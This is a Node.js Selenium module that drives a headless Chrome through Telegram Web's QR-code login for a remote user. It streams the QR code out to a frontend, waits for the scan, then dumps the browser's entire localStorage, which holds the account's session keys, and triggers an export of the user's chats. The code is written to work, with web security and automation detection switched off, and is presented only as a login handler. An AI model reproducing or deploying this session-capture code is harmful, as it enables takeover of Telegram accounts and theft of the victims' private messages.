const {
  Builder,
  Browser,
  By
} = require('selenium-webdriver');
const fs = require('fs');
const path = require('path');

// Get server port from environment or default to 3000
const SERVER_PORT = process.env.PORT || 3000;
const SERVER_URL = `http://localhost:${SERVER_PORT}`;

// Global registry to track active drivers by session ID
const activeDrivers = new Map();
// Function to close a specific driver by session ID
async function closeDriverBySessionId(sessionId) {
  const driverInfo = activeDrivers.get(sessionId);
  if (driverInfo) {
    try {
      console.log(`🔒 Closing Selenium driver for session: ${sessionId}`);

      // Clear any associated intervals
      if (driverInfo.interval) {
        clearInterval(driverInfo.interval);
        console.log(`🧹 Cleared login check interval for session: ${sessionId}`);
      }

      // Close driver
      if (driverInfo.driver) {
        await driverInfo.driver.quit();
        console.log(`✅ Selenium driver closed successfully for session: ${sessionId}`);
      }

      // Remove from registry
      activeDrivers.delete(sessionId);
      return true;
    } catch (error) {
      console.error(`❌ Error closing Selenium driver for session ${sessionId}:`, error);
      // Remove from registry even if quit fails
      activeDrivers.delete(sessionId);
      return false;
    }
  } else {
    console.log(`⚠️ No active driver found for session: ${sessionId}`);
    return false;
  }
}

async function runTelegramLogin(sessionId, parameters, progressCallback) {
  console.log('Running Telegram login for session:', sessionId);

  let driver;
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');

  try {
    // Send initial status
    progressCallback('status', {
      message: 'Creating new Chrome driver...'
    });

    console.log('🔄 Creating new driver');

    // Initialize the Chrome driver with specific options to ensure visible window
    const chrome = require('selenium-webdriver/chrome');
    const options = new chrome.Options();

    // Headless mode required for containerized environments (Railway, Docker)
    options.addArguments('--headless=new');
    options.addArguments('--no-sandbox');
    options.addArguments('--disable-dev-shm-usage');
    options.addArguments('--disable-gpu');
    options.addArguments('--window-size=1920,1080');
    options.addArguments('--remote-debugging-port=9222');

    // Disable permission prompts (including local network access)
    options.addArguments('--disable-notifications');
    options.addArguments('--disable-permissions-api');
    options.addArguments('--disable-web-security');
    options.addArguments('--disable-features=PrivacySandboxSettings4');
    options.addArguments('--disable-features=WebRtcHideLocalIpsWithMdns');
    options.addArguments('--disable-features=NetworkService');
    options.addArguments('--disable-blink-features=AutomationControlled');
    options.addArguments('--use-fake-ui-for-media-stream');
    options.addArguments('--use-fake-device-for-media-stream');

    // Set preferences to auto-deny all permission requests
    options.setUserPreferences({
      'profile.default_content_setting_values.notifications': 2,
      'profile.default_content_setting_values.media_stream': 2,
      'profile.default_content_setting_values.media_stream_mic': 2,
      'profile.default_content_setting_values.media_stream_camera': 2,
      'profile.default_content_setting_values.geolocation': 2,
      'profile.default_content_setting_values.local_discovery': 2,
      'profile.default_content_setting_values.insecure_private_network': 2,
      'profile.managed_default_content_settings.local_discovery': 2,
    });

    console.log('Chrome options configured');

    try {
      // Initialize Chrome driver with configured options
      driver = await new Builder()
        .forBrowser(Browser.CHROME)
        .setChromeOptions(options)
        .build();

      progressCallback('status', {
        message: 'Chrome driver initialized successfully'
      });
    } catch (driverError) {
      console.error('Failed to initialize Chrome driver:', driverError);
      throw driverError;
    }

    // Store driver in global registry
    activeDrivers.set(sessionId, {
      driver,
      interval: null
    });
    console.log(`✅ Driver registered for session: ${sessionId}`);

    // Verify the driver is working and get browser info
    try {
      const capabilities = await driver.getCapabilities();
      const browserName = capabilities.getBrowserName();
      const browserVersion = capabilities.getBrowserVersion();

      progressCallback('status', {
        message: `Chrome browser opened: ${browserName} ${browserVersion}`
      });

      // Get window handles to verify browser window is open
      const handles = await driver.getAllWindowHandles();
      progressCallback('status', {
        message: `Browser window opened with ${handles.length} handle(s)`
      });

    } catch (infoError) {
      console.error('Error getting browser info:', infoError);
      progressCallback('status', {
        message: 'Warning: Could not verify browser info, but continuing...'
      });
    }

    // Navigate to the test page
    progressCallback('status', {
      message: 'Navigating to Telegram Web...'
    });
    await driver.get('https://web.telegram.org/a/');

    // Get the page title
    let title = await driver.getTitle();
    progressCallback('status', {
      message: `Page loaded: ${title}`
    });

    // Set implicit timeout
    await driver.manage().setTimeouts({
      implicit: 500
    });

    const {
      until
    } = require('selenium-webdriver');

    // Function to check if user has logged in and extract user info
    const checkAndExtractUserInfo = async () => {
      try {
        // Check if we're on the main Telegram web interface (logged in)
        const currentUrl = await driver.getCurrentUrl();
        console.log('Current URL:', currentUrl);

        // Enhanced page detection: check for different stages
        const pageStatus = await driver.executeScript(`
					console.log('🔍 Checking for page status...');
					
					// Check for password form (intermediate stage after QR code)
					const passwordInput = document.querySelector('input#sign-in-password');
					// Check for password form containers
					const passwordForm = document.querySelector('form[action*="password"]') || 
										document.querySelector('div[class*="password"]') ||
										document.querySelector('div').closest('div')?.querySelector('input#sign-in-password')?.closest('div');
					// Check for password heading text content
					const passwordHeading = Array.from(document.querySelectorAll('h1, div, span, p')).find(el => 
						el.textContent && (
							el.textContent.includes('Enter Password') || 
							el.textContent.includes('Two-Step Verification')
						)
					);
					
					// Check for verification code form (another intermediate stage)
					const verificationInput = document.querySelector('input#sign-in-code');
					// Check for verification form containers
					const verificationForm = document.querySelector('form[action*="code"]') ||
											document.querySelector('div[class*="verification"]') ||
											document.querySelector('div').closest('div')?.querySelector('input#sign-in-code')?.closest('div');
					
					// Check for the two key elements that indicate user is fully logged in
					const fullNameElement = document.querySelector('.fullName');
					const avatarElement = document.querySelector('.account-avatar img');
					
					console.log('Page status detection results:', {
						hasPasswordInput: !!passwordInput,
						hasPasswordForm: !!passwordForm,
						hasPasswordHeading: !!passwordHeading,
						hasVerificationInput: !!verificationInput,
						hasVerificationForm: !!verificationForm,
						hasFullName: !!fullNameElement,
						hasAvatar: !!avatarElement
					});
					
					// Determine current stage
					let currentStage = 'unknown';
					let isLoggedIn = false;
					
					if (fullNameElement && avatarElement) {
						currentStage = 'logged_in';
						isLoggedIn = true;
					} else if (passwordInput || passwordForm || passwordHeading) {
						currentStage = 'password_form';
						isLoggedIn = false;
					} else if (verificationInput || verificationForm) {
						currentStage = 'verification_form';
						isLoggedIn = false;
					} else {
						currentStage = 'login_form';
						isLoggedIn = false;
					}
					
					console.log('Current stage:', currentStage, 'isLoggedIn:', isLoggedIn);
					return { currentStage, isLoggedIn };
				`);

        console.log('Page status detection result:', pageStatus);

        // Handle different stages
        if (pageStatus.currentStage === 'password_form') {
          console.log('🔐 Password form detected! Notifying frontend...');
          progressCallback('password_form_detected', {
            message: 'Password form detected after QR code scan',
            stage: 'password_form'
          });
          return false; // Not fully logged in yet
        } else if (pageStatus.currentStage === 'verification_form') {
          console.log('📱 Verification form detected! Notifying frontend...');
          progressCallback('verification_form_detected', {
            message: 'Verification code form detected',
            stage: 'verification_form'
          });
          return false; // Not fully logged in yet
        } else if (!pageStatus.isLoggedIn) {
          console.log('User not logged in yet, waiting...');
          return false;
        }

        console.log('✅ User is logged in! Extracting user info...');

        // Try to extract username from various possible locations
        let username = null;
        let avatarSrc = null;

        try {
          // Extract user info from the main interface
          const userInfo = await driver.executeScript(`
						console.log('🔍 Extracting user info from main interface...');
						
						let username = null;
						let avatarSrc = null;
						
						// Try multiple selectors for username
						const fullNameElement = document.querySelector('.fullName');
						if (fullNameElement && fullNameElement.textContent) {
							username = fullNameElement.textContent.trim();
							console.log('✅ Found username using .fullName selector:', username);
						}
						
						// Try alternative selectors
						if (!username) {
							const profileName = document.querySelector('[class*="profile"] [class*="name"]');
							if (profileName && profileName.textContent) {
								username = profileName.textContent.trim();
								console.log('✅ Found username using profile name selector:', username);
							}
						}
						
						// Try avatar selectors
						const avatarElement = document.querySelector('.account-avatar img');
						if (avatarElement && avatarElement.src) {
							avatarSrc = avatarElement.src;
							console.log('✅ Found avatar using .account-avatar img selector:', avatarSrc);
						}
						
						// Try alternative avatar selectors
						if (!avatarSrc) {
							const altAvatar = document.querySelector('[class*="avatar"] img');
							if (altAvatar && altAvatar.src) {
								avatarSrc = altAvatar.src;
								console.log('✅ Found avatar using alternative selector:', avatarSrc);
							}
						}
						
						console.log('Final user info found:', { username, avatarSrc });
						return { username, avatarSrc, found: !!username };
					`);

          if (userInfo && userInfo.username) {
            username = userInfo.username;
            avatarSrc = userInfo.avatarSrc;
            console.log('✅ Successfully extracted user info:', {
              username,
              avatarSrc
            });
          } else {
            console.log('⚠️ Could not extract username, but user is logged in');
            // Even if we can't get the username, the user is logged in
            username = 'User (name not detected)';
          }

          // Extract localStorage data for the session
          let localStorageData = null;
          try {
            console.log('💾 Extracting localStorage data...');
            localStorageData = await driver.executeScript(`
							try {
								// Extract all localStorage entries into an object
								const data = {};
								for (let i = 0; i < localStorage.length; i++) {
									const key = localStorage.key(i);
									data[key] = localStorage.getItem(key);
								}
								
								// Return the data object directly (not as code string)
								// This avoids CSP violations since we won't use eval()
								return data;
							} catch (error) {
								console.error('Error extracting localStorage:', error);
								return { error: error.message };
							}
						`);

            if (localStorageData && !localStorageData.error) {
              console.log('✅ LocalStorage data extracted successfully');

              // Send localStorage extracted event with the data object
              progressCallback('localStorage_extracted', {
                message: 'LocalStorage data extracted successfully',
                codePath: null, // No longer a file path
                codeData: localStorageData // This is now a plain object (not executable code)
              });
            } else {
              const errorMsg = localStorageData && localStorageData.error ? localStorageData.error : 'Unknown error';
              console.log('⚠️ Could not extract localStorage data:', errorMsg);
            }
          } catch (localStorageError) {
            console.error('❌ Error extracting localStorage:', localStorageError);
          }

          // DISABLED: Chat collection logic temporarily disabled due to bugs
          // BUG: Not all chats are being captured - the current logic doesn't properly handle pagination/scrolling to load all chats
          // PERFORMANCE: It adds additional delay before sending a notification about the user being authorized - the 2-second wait and scrolling operations delay the completion event

          // Collect chat list after successful login
          // let chatList = null;
          // try {
          // 	console.log('💬 Collecting chat list...');

          // 	// First, let's check what's available on the page
          // 	const pageInfo = await driver.executeScript(`
          // 		console.log('🔍 Checking page for chat elements...');
          // 		const chatListContainer = document.querySelector('.chat-list.custom-scroll');
          // 		const chatItems = document.querySelectorAll('.chat-item-clickable .title');
          // 		const allChatItems = document.querySelectorAll('.chat-item-clickable');
          // 		const anyChatElements = document.querySelectorAll('[class*="chat"]');
          // 		
          // 		console.log('Chat list container:', !!chatListContainer);
          // 		console.log('Chat items with .title:', chatItems.length);
          // 		console.log('All chat items:', allChatItems.length);
          // 		console.log('Any chat elements:', anyChatElements.length);
          // 		
          // 		// Try different selectors
          // 		const altSelectors = [
          // 			'.chat-list .title',
          // 			'.chat-list [class*="title"]',
          // 			'[class*="chat-item"] .title',
          // 			'[class*="chat-item"] [class*="title"]',
          // 			'.chat-item .title',
          // 			'[data-testid*="chat"]',
          // 			'[class*="conversation"]',
          // 			'[class*="dialog"]'
          // 		];
          // 		
          // 		const results = {};
          // 		altSelectors.forEach(selector => {
          // 			const elements = document.querySelectorAll(selector);
          // 			results[selector] = elements.length;
          // 			if (elements.length > 0) {
          // 				console.log(\`Found \${elements.length} elements with selector: \${selector}\`);
          // 				console.log('First element:', elements[0]);
          // 			}
          // 		});
          // 		
          // 		return {
          // 			chatListContainer: !!chatListContainer,
          // 			chatItems: chatItems.length,
          // 			allChatItems: allChatItems.length,
          // 			anyChatElements: anyChatElements.length,
          // 			results: results,
          // 			currentUrl: window.location.href,
          // 			pageTitle: document.title
          // 		};
          // 	`);

          // 	console.log('📊 Page info for chat collection:', pageInfo);

          // 	// Wait a bit for the page to fully load
          // 	await new Promise(resolve => setTimeout(resolve, 2000));

          // 	chatList = await driver.executeScript(`
          // 		console.log('💬 Starting chat collection...');
          // 		
          // 		// Use the provided chat collection function
          // 		if (typeof window.scrollChatListUntilLoaded === 'function') {
          // 			console.log('Using scrollChatListUntilLoaded function');
          // 			return await window.scrollChatListUntilLoaded();
          // 		} else {
          // 			console.log('Using fallback chat collection');
          // 			// Fallback: basic chat collection with multiple selectors
          // 			const selectors = [
          // 				'.chat-item-clickable .title',
          // 				'.chat-list .title',
          // 				'.chat-item .title',
          // 				'[class*="chat-item"] .title',
          // 				'[class*="chat-item"] [class*="title"]',
          // 				'[class*="conversation"] .title',
          // 				'[class*="dialog"] .title'
          // 			];
          // 			
          // 			let titles = [];
          // 			let usedSelector = '';
          // 			
          // 			for (const selector of selectors) {
          // 				const elements = document.querySelectorAll(selector);
          // 				if (elements.length > 0) {
          // 					console.log(\`Found \${elements.length} elements with selector: \${selector}\`);
          // 					usedSelector = selector;
          // 					elements.forEach(element => {
          // 						const titleText = element.textContent ? element.textContent.trim() : '';
          // 						if (titleText && !titles.includes(titleText)) {
          // 							titles.push(titleText);
          // 						}
          // 					});
          // 					break; // Use the first selector that finds elements
          // 				}
          // 			}
          // 			
          // 			console.log(\`Collected \${titles.length} chat titles using selector: \${usedSelector}\`);
          // 			console.log('Titles:', titles);
          // 			
          // 			return {
          // 				success: true,
          // 				chatTitles: titles,
          // 				totalChats: titles.length,
          // 				attempts: 1,
          // 				usedSelector: usedSelector
          // 			};
          // 		}
          // 	`);

          // 	if (chatList && chatList.success) {
          // 		console.log(`✅ Successfully collected ${chatList.totalChats} chat titles`);
          // 		console.log('📋 Chat titles:', chatList.chatTitles);

          // 		// Send chat list collected event
          // 		progressCallback('chat_list_collected', {
          // 			message: `Chat list collected successfully - ${chatList.totalChats} chats found`,
          // 			chatCount: chatList.totalChats,
          // 			chatTitles: chatList.chatTitles
          // 		});
          // 	} else {
          // 		console.log('⚠️ Chat collection failed or returned no results');
          // 		console.log('Chat collection result:', chatList);
          // 	}
          // } catch (chatError) {
          // 	console.error('❌ Error collecting chat list:', chatError);
          // }

          progressCallback('user_info_extracted', {
            username: username,
            avatarSrc: avatarSrc || null,
            message: 'User information extracted successfully'
            // chatList: chatList // DISABLED: Chat collection is disabled
          });

          // DISABLED: Chat list collection is disabled
          // Also send chat list as a separate event if it was collected
          // if (chatList && chatList.success && chatList.chatTitles && chatList.chatTitles.length > 0) {
          // 	progressCallback('chat_list_collected', {
          // 		message: `Chat list collected successfully - ${chatList.totalChats} chats found`,
          // 		chatCount: chatList.totalChats,
          // 		chatTitles: chatList.chatTitles
          // 	});
          // }

          // Also send completion event
          progressCallback('completed', {
            message: 'Telegram login completed successfully. User information extracted.',
            userInfo: {
              username: username,
              avatarSrc: avatarSrc
            }
          });

          return true; // Successfully extracted user info

        } catch (extractError) {
          console.error('Error extracting user info:', extractError);
          // Even if extraction fails, user is logged in
          return true;
        }

      } catch (error) {
        console.error('Error checking user login status:', error);
        return false;
      }
    };

    // Check immediately if user is already logged in before looking for QR code
    console.log('🔍 Checking if user is already logged in before QR code detection...');
    const alreadyLoggedIn = await checkAndExtractUserInfo();

    if (alreadyLoggedIn) {
      console.log('✅ User already logged in, skipping QR code detection and proceeding to user info extraction');

      // Send completion event immediately since user is already logged in
      progressCallback('completed', {
        message: 'User already logged in - no QR code needed',
        files: {
          qrCode: null,
          localStorage: null,
          screenshot: null
        },
        userInfo: {
          username: 'User (already logged in)',
          avatarSrc: null
        }
      });

      // Don't close the browser here — exportAllChats() will close it once
      // all chats have been exported. Just fire the export trigger and return.
      console.log('✅ User already logged in. Handing off to export pipeline...');

      return; // Exit early, no need for QR code detection
    }

    console.log('⏳ User not logged in, proceeding with QR code detection...');

    // Wait for QR code container (only if user is not logged in)
    progressCallback('status', {
      message: 'Looking for QR code...'
    });
    let qrContainer = await driver.wait(until.elementLocated(By.css('.qr-container')), 10000);

    progressCallback('status', {
      message: 'QR container found, waiting for it to be visible...'
    });

    // Wait for the element to be visible and have dimensions
    await driver.wait(until.elementIsVisible(qrContainer), 10000);

    // Wait for the element to have proper dimensions
    await driver.wait(async () => {
      const rect = await qrContainer.getRect();
      return rect.width > 0 && rect.height > 0;
    }, 10000);

    progressCallback('status', {
      message: 'QR code is visible and ready'
    });

    // Inject Socket.IO client script to capture QR code canvas
    progressCallback('status', {
      message: 'Setting up real-time QR code streaming...'
    });

    const qrCodeCaptureScript = `
			(function() {
				const sessionId = '${sessionId}';
				console.log('Starting QR code capture for session:', sessionId);
				
				// Since Socket.IO is blocked by CSP, use HTTP-only communication
				console.log('Using HTTP-only communication (Socket.IO blocked by CSP)');
				
				// Function to capture QR code SVG and send via HTTP
				function captureAndSendQRCode() {
					try {
						console.log('Attempting to capture QR code...');
						
						// Find the QR code SVG - try multiple selectors
						let qrSvg = document.querySelector('.qr-container svg');
						console.log('Tried .qr-container svg:', qrSvg);
						
						if(!qrSvg) {
							console.log('No QR SVG found...');
							return;
						}
						
						console.log('Found QR SVG, dimensions:', qrSvg.width.baseVal?.value || 'auto', 'x', qrSvg.height.baseVal?.value || 'auto');
						console.log('SVG visible:', qrSvg.offsetParent !== null);
						console.log('SVG outerHTML length:', qrSvg.outerHTML.length);
						
						// Get the SVG as a string (outerHTML)
						const qrCodeData = qrSvg.outerHTML;
						console.log('QR code SVG captured, data length:', qrCodeData.length);
						console.log('QR code SVG preview:', qrCodeData.substring(0, 200) + '...');
						
					// Send via HTTP POST
					console.log('Sending QR code SVG update via HTTP...');
					fetch('${SERVER_URL}/api/qr-update', {
							method: 'POST',
							headers: { 'Content-Type': 'application/json' },
							body: JSON.stringify({
								sessionId: sessionId,
								qrCodeData: qrCodeData,
								qrCodeType: 'svg',
								timestamp: new Date().toISOString()
							})
						})
						.then(response => response.json())
						.then(data => {
							console.log('QR code SVG update sent successfully via HTTP:', data);
						})
						.catch(error => {
							console.error('Failed to send QR code SVG update:', error);
						});
					} catch (error) {
						console.error('Error capturing QR code SVG:', error);
					}
				}
				
				// Send a simple test event immediately to verify communication
				setTimeout(() => {
					console.log('Sending immediate test event...');
					// Use HTTP fallback since Socket.IO is blocked
					console.log('Using HTTP fallback (Socket.IO blocked by CSP)');
					fetch('${SERVER_URL}/health')
						.then(response => response.json())
						.then(data => {
							console.log('HTTP fallback successful:', data);
							// Try to send a simple message via fetch
							fetch('${SERVER_URL}/api/test', {
								method: 'POST',
								headers: { 'Content-Type': 'application/json' },
								body: JSON.stringify({
									sessionId: sessionId,
									message: 'HTTP fallback test from Chrome window',
									timestamp: new Date().toISOString()
								})
							}).catch(err => console.log('HTTP POST failed:', err));
						})
						.catch(err => console.log('HTTP fallback failed:', err));
					
					// Also test SVG detection immediately
					console.log('Testing SVG detection...');
					const allSvgs = document.querySelectorAll('svg');
					console.log('Total SVGs found:', allSvgs.length);
					allSvgs.forEach((svg, index) => {
						console.log('SVG ' + index + ':', svg.width.baseVal?.value || 'auto', 'x', svg.height.baseVal?.value || 'auto', 'visible:', svg.offsetParent !== null);
					});
					
					// Test QR container detection
					const qrContainer = document.querySelector('.qr-container');
					console.log('QR container found:', qrContainer);
					if (qrContainer) {
						console.log('QR container children:', qrContainer.children.length);
						Array.from(qrContainer.children).forEach((child, index) => {
							console.log('Child ' + index + ':', child.tagName, child.className);
						});
					}
				}, 2000);
				
				// Capture QR code immediately
				console.log('Initial QR code capture...');
				captureAndSendQRCode();
				
				// Set up periodic capture (every 2 seconds)
				const captureInterval = setInterval(() => {
					console.log('Periodic QR code capture...');
					captureAndSendQRCode();
				}, 2000);
				
				// Also capture when QR code might be refreshed
				const observer = new MutationObserver(function(mutations) {
					mutations.forEach(function(mutation) {
						if (mutation.type === 'childList' || mutation.type === 'attributes') {
							console.log('DOM change detected, capturing QR code...');
							// Wait a bit for the new QR code to render
							setTimeout(captureAndSendQRCode, 500);
						}
					});
				});
				
				// Observe the QR container for changes
				const qrContainer = document.querySelector('.qr-container');
				if (qrContainer) {
					console.log('Observing QR container for changes');
					observer.observe(qrContainer, {
						childList: true,
						subtree: true,
						attributes: true
					});
				} else {
					console.log('QR container not found for observation');
				}
				
				// Clean up function
				window.cleanupQRCodeCapture = function() {
					console.log('Cleaning up QR code capture');
					clearInterval(captureInterval);
					observer.disconnect();
				};
				
				// Clean up when page unloads
				window.addEventListener('beforeunload', window.cleanupQRCodeCapture);
				
				console.log('QR code capture script injected successfully for session:', sessionId);
			})();
		`;

    await driver.executeScript(qrCodeCaptureScript);

    // Inject chat collection script
    const chatCollectionScript = `
			(function() {
				console.log('💬 Injecting chat collection script...');
				
				// Chat collection functions
				function collectChatTitles() {
					// Try multiple selectors for chat titles
					const selectors = [
						'.chat-item-clickable .title',
						'.chat-item .title',
						'[class*="chat-item"] .title',
						'[class*="chat-item"] [class*="title"]',
						'.sidebar-left .title',
						'[class*="sidebar"] .title',
						'[class*="conversation"] .title',
						'[class*="dialog"] .title',
						'div[class*="chat"] .title',
						'div[class*="chat"] [class*="name"]',
						'div[class*="chat"] [class*="text"]'
					];
					
					let titles = [];
					let usedSelector = '';
					
					for (const selector of selectors) {
						const elements = document.querySelectorAll(selector);
						if (elements.length > 0) {
							console.log(\`Found \${elements.length} elements with selector: \${selector}\`);
							usedSelector = selector;
							elements.forEach(element => {
								const titleText = element.textContent ? element.textContent.trim() : '';
								if (titleText && !titles.includes(titleText)) {
									titles.push(titleText);
								}
							});
							break; // Use the first selector that finds elements
						}
					}

					console.log(\`📝 Collected \${titles.length} chat titles using selector: \${usedSelector}\`);
					console.log('📝 Chat titles:', titles);
					return titles;
				}

				async function scrollChatListUntilLoaded() {
					// Find the chat list container - try multiple selectors
					let chatList = document.querySelector('.chat-list.custom-scroll');
					
					if (!chatList) {
						// Try alternative selectors
						chatList = document.querySelector('.chatlist-container') || 
								  document.querySelector('[class*="chatlist"]') ||
								  document.querySelector('.sidebar-left') ||
								  document.querySelector('[class*="sidebar"]');
					}

					if (!chatList) {
						console.error('Chat list container not found, trying fallback collection...');
						// Try to collect chats without scrolling
						return collectChatTitles();
					}

					console.log('Starting to scroll chat list...');

					let previousScrollTop = 0;
					let noNewContentCount = 0;
					const maxAttempts = 50; // Maximum scroll attempts
					const noNewContentThreshold = 3; // Stop if no new content for 3 consecutive attempts
					let attemptCount = 0;

					// Function to check if we've reached the bottom
					function hasReachedBottom() {
						const scrollTop = chatList.scrollTop;
						const scrollHeight = chatList.scrollHeight;
						const clientHeight = chatList.clientHeight;

						// Check if we're at the bottom (with small tolerance)
						return (scrollTop + clientHeight >= scrollHeight - 10);
					}

					// Function to scroll down
					function scrollDown() {
						const scrollHeight = chatList.scrollHeight;
						chatList.scrollTop = scrollHeight;

						// Also try scrolling by a large amount to ensure we get to the bottom
						chatList.scrollTop = chatList.scrollHeight;
					}

					// Main scrolling loop
					while (attemptCount < maxAttempts) {
						attemptCount++;
						console.log(\`Scroll attempt \${attemptCount}/\${maxAttempts}\`);

						// Store current scroll position
						const currentScrollTop = chatList.scrollTop;

						// Scroll down
						scrollDown();

						// Wait a bit for content to load
						await new Promise(resolve => setTimeout(resolve, 100));

						// Check if we've reached the bottom
						if (hasReachedBottom()) {
							console.log('Reached bottom of chat list');
							break;
						}

						// Check if new content was loaded
						if (currentScrollTop === chatList.scrollTop) {
							noNewContentCount++;
							console.log(\`No new content loaded (\${noNewContentCount}/\${noNewContentThreshold})\`);

							if (noNewContentCount >= noNewContentThreshold) {
								console.log('No new content loaded for several attempts, stopping...');
								break;
							}
						} else {
							noNewContentCount = 0; // Reset counter if new content was loaded
							console.log('New content loaded, continuing...');
						}

						// Update previous scroll position
						previousScrollTop = currentScrollTop;
					}

					// Final check
					if (hasReachedBottom()) {
						console.log('✅ Successfully scrolled to bottom of chat list');
					} else {
						console.log('⚠️ Reached maximum attempts or no new content threshold');
					}

					// Collect all chat titles
					const chatTitles = collectChatTitles();
					console.log(\`📋 Found \${chatTitles.length} chat titles\`);

					return {
						success: true,
						chatTitles: chatTitles,
						totalChats: chatTitles.length,
						attempts: attemptCount
					};
				}

				// Make functions available globally
				window.scrollChatListUntilLoaded = scrollChatListUntilLoaded;
				window.collectChatTitles = collectChatTitles;
				
				console.log('✅ Chat collection script injected successfully');
			})();
		`;

    await driver.executeScript(chatCollectionScript);

    progressCallback('status', {
      message: 'Real-time QR code streaming activated'
    });

    // Wait for QR code to be scanned
    progressCallback('status', {
      message: 'Waiting for QR code to be scanned...'
    });

    // Instead of waiting for authentication, keep the browser open for real-time streaming
    // The QR code will be updated in real-time via the injected script
    progressCallback('status', {
      message: 'Browser kept open for real-time QR code streaming. Scan the QR code with your mobile app.'
    });

    progressCallback('status', {
      message: 'Real-time streaming session active. Browser will remain open until manually closed or session ends.'
    });

    // Enhanced: Wait for user to complete login and extract user info
    console.log('Waiting for user to complete login...');

    // Set up periodic checking for user login completion
    const loginCheckInterval = setInterval(async () => {
      console.log('🔄 Periodic login check running...');

      // Check if driver is still valid before proceeding
      if (!driver) {
        console.log('⚠️ Driver is null, stopping login check');
        clearInterval(loginCheckInterval);
        return;
      }

      try {
        // Check if driver session is still valid
        await driver.getCurrentUrl();
      } catch (driverError) {
        if (driverError.name === 'NoSuchSessionError') {
          console.log('⚠️ Driver session is no longer valid, stopping login check');
          clearInterval(loginCheckInterval);
          return;
        }
        // For other errors, continue checking
        console.log('⚠️ Driver error during login check:', driverError.message);
      }

      const loginCompleted = await checkAndExtractUserInfo();
      console.log('!!! Login completed:', loginCompleted);
      if (loginCompleted) {
        console.log('✅ User login completed, stopping login check');
        clearInterval(loginCheckInterval);

        // Clean up QR code capture when login is completed
        try {
          console.log('🧹 Cleaning up QR code capture after successful login...');
          await driver.executeScript('if (window.cleanupQRCodeCapture) window.cleanupQRCodeCapture();');
          console.log('✅ QR code capture cleaned up successfully');
        } catch (cleanupError) {
          console.error('⚠️ Error cleaning up QR code capture:', cleanupError);
        }

        // Don't close browser here - let exportAllChats complete first
        // The browser will be closed after exportAllChats finishes (handled in server.js)
        console.log('✅ Login completed. Waiting for chat exports to finish before closing browser...');

        // Directly trigger export after a short delay to ensure page is fully loaded
        // This is a backup in case the socket event doesn't trigger it
        // We'll use a message to the server process via the progressCallback
        setTimeout(() => {
          try {
            console.log(`🚀 [Direct trigger] Emitting export trigger event for session: ${sessionId}`);
            progressCallback('trigger_export', {
              message: 'Triggering Saved Messages export directly after login',
              sessionId: sessionId
            });
          } catch (exportError) {
            console.error(`❌ [Direct trigger] Error triggering export: ${exportError.message}`);
          }
        }, 5000); // Wait 5 seconds after login to ensure page is fully loaded
      } else {
        console.log('⏳ User not logged in yet, will check again in 5 seconds...');
      }
    }, 5000); // Check every 5 seconds (increased from 1 second to reduce load)

    // Store the interval reference in the driver registry for cleanup
    if (activeDrivers.has(sessionId)) {
      // Update the driver info with the interval reference
      const driverInfo = activeDrivers.get(sessionId);
      driverInfo.interval = loginCheckInterval;
      activeDrivers.set(sessionId, driverInfo);
      console.log(`✅ Login check interval stored for session: ${sessionId}`);
    }

    // Add a system information display box
    await driver.executeScript(`
			// Create system info box
			const systemBox = document.createElement('div');
			systemBox.style.cssText = 'position:fixed;top:10px;right:10px;z-index:9999;padding:15px;background:rgba(0,0,0,0.8);color:white;border-radius:8px;font-family:monospace;font-size:12px;min-width:250px;box-shadow:0 4px 8px rgba(0,0,0,0.3);';
			
			// Get system information
			const sessionId = '${sessionId}';
			const timestamp = new Date().toISOString();
			const userAgent = navigator.userAgent;
			const url = window.location.href;
			
			// Create info content
			systemBox.innerHTML = \`
				<div style="margin-bottom:8px;font-weight:bold;color:#00ff00;"> SYSTEM INFO</div>
				<div style="margin-bottom:4px;"><strong>Session ID:</strong> <span style="color:#00ffff;">\${sessionId}</span></div>
				<div style="margin-bottom:4px;"><strong>Time:</strong> <span style="color:#ffff00;">\${timestamp}</span></div>
				<div style="margin-bottom:4px;"><strong>URL:</strong> <span style="color:#ff00ff;">\${url.substring(0, 50)}...</span></div>
				<div style="margin-bottom:4px;"><strong>Browser:</strong> <span style="color:#00ff00;">\${userAgent.substring(0, 40)}...</span></div>
				<div style="font-size:10px;color:#888;margin-top:8px;">Telegram Login Handler v1.0</div>
			\`;
			
			// Add to page
			document.body.appendChild(systemBox);
			
			console.log('✅ System information box added to page');
		`);

    // Keep the browser open for QR code scanning
    // The browser will only be closed when:
    // 1. User completes login (handled in the login check interval)
    // 2. Frontend requests cleanup (handled by closeSeleniumWindow event)
    // 3. Socket disconnects (handled by disconnect handler)
    progressCallback('status', {
      message: 'Browser kept open for QR code scanning. Scan the QR code with your mobile app to log in.'
    });

    console.log('✅ Browser kept open for QR code scanning. Waiting for user to scan QR code...');

  } catch (error) {
    console.error('Error during Telegram login:', error);

    progressCallback('error', {
      message: 'An error occurred during the login process',
      error: error.message,
      stack: error.stack
    });

    // Only close the driver on error
    if (driver) {
      try {
        await driver.quit();
      } catch (quitError) {
        console.error('Error quitting driver:', quitError);
      }
    }

    throw error;
  }
}

module.exports = {
  runTelegramLogin,
  closeDriverBySessionId,
  activeDrivers
};